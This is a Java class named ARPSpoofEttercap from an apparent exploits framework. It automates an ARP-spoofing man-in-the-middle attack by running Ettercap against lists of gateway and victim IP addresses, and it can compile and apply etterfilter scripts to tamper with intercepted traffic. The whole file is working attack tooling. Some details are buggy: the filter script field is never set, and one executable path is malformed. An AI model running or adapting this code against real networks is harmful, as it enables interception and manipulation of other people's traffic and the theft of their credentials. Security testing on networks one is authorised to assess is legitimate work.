package exploits.mitm;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;

public class ARPSpoofEttercap extends ManInTheMiddle {
	
	private List<String> gatewayIPs;
	private List<String> victimIPs;
	private List<Integer> ports;
	private File filterScript = null;
	private File pcapLog = null;
	private File messageLog = null;
	
	/**
	 * Takes in only single addresses for victim and gateway for
	 * a small spoof only covering one connection
	 * @param gatewayIP
	 * 		A single gateway address
	 * @param victimIP
	 * 		A single victim IP address
	 */
	public ARPSpoofEttercap(String gatewayIP, String victimIP) {
		List<String> gateways = new ArrayList<String>();
		gateways.add(gatewayIP);
		this.gatewayIPs = gateways;
		List<String> victims = new ArrayList<String>();
		victims.add(victimIP);
		this.victimIPs = victims;
	}
	
	/**
	 * Since no ports are specified, all will be used.
	 * @param gatewayIPs
	 * 		A list of 
	 */
	public ARPSpoofEttercap(List<String> gatewayIP, List<String> victimIPs) {
		this(gatewayIP, victimIPs, null);
	}
	
	/**
	 * @param side1Addrs - A List containing the IP address on one side of the attack
	 * @param side2Addrs - A List containing the IP address on the opposite side of the attack as those of host1Addrs
	 * @param ports - A List containing the ports on which to sniff. All ports will be used if null.
	 */
	public ARPSpoofEttercap(List<String> gatewayIPs, List<String> victimIPs,
			List<Integer> ports) {
		super(gatewayIPs, victimIPs);
		this.ports = ports;
	}
	
	/**
	 * Checks to see if the file exists and, if it does, compiles it with
	 * Etterfilter to be run in the ARP spoof.
	 * If the file does not exist, say so and do not set the filter script
	 * @param filterScriptFile 
	 * 		A file containing the uncompiled source
	 * 		code of an Etterfilter script
	 * @throws IOException
	 * 		if the file does not exist or the etterfilter executable
	 * 		cannot be found
	 */
	public void setFilterScriptUncomp(File filterScriptFile) throws IOException {
		if (!filterScriptFile.exists()) {
			throw new IOException("File does not exist");
		}
		String compiledFilterName = filterScriptFile.getName() // remove file extention
				.substring(0, filterScriptFile.getName().lastIndexOf("."));
		compiledFilterName += ".ef"; // add compiled extention
		sendProcessInput("opt/ettercap/bin/etterfilter -o " + compiledFilterName + 
				" " + filterScriptFile.getName());
		// if errors were found when compiling the script
		if (readProcessOutput("Script encoded into", 1000) == null) {
			filterScriptFile = null;
			System.out.println("Error compiling the file");
		}
	}
	
	/**
	 * Parses {@link #gatewayIPs} {@link #}
	 */
	@Override
	public void runAttack() throws IOException {
		
		String gatewayIPs = "/";
		for (String addr : this.gatewayIPs)
			gatewayIPs += addr + ",";
		// remove final ',' and add "//<space>"
		gatewayIPs = gatewayIPs.substring(0, gatewayIPs.length() - 1) + "// ";
		System.out.println(gatewayIPs);
		
		// do the same for victim IPs
		String victimIPs = "/";
		for (String addr : this.victimIPs)
			victimIPs += addr + ",";
		/* remove final ',' and add "//<space>" */
		victimIPs = victimIPs.substring(0, victimIPs.length() - 1) + "// ";
		System.out.println(victimIPs);
		
		// if a filter exists, set the command to run in in Ettercap
		String filterCommand = "";
		if (filterScript != null) {
			filterCommand = "-F " + filterScript.getAbsolutePath() + " ";
		}
		
		sendProcessInput(
				"ettercap -T -q -M arp:remote " +
				filterCommand + gatewayIPs + victimIPs);
		// when ettercap is done loading, it prints "Hit 'h' for inline help"
		System.out.println(
				readProcessOutput("Hit 'h' for inline help", 3000).getOutput());
		
		// get input from keyboard (for testing purposes)
		java.util.Scanner keyBoard = new java.util.Scanner(System.in);
		String command;
		do {
			command = keyBoard.nextLine();
			sendProcessInput(command);
			readProcessOutput(3000);
		} while (!command.equals("q"));
	}
	
	@Override
	protected void cleanup() {
		try {
			// quit ettercap
			sendProcessInput("q");
			System.out.println(readProcessOutput(3000));
		} catch (IOException ex) {
			logger.log(Level.WARNING, "Ettercap could not be exited", ex);
		}
		
		super.cleanup();
	}
	
}
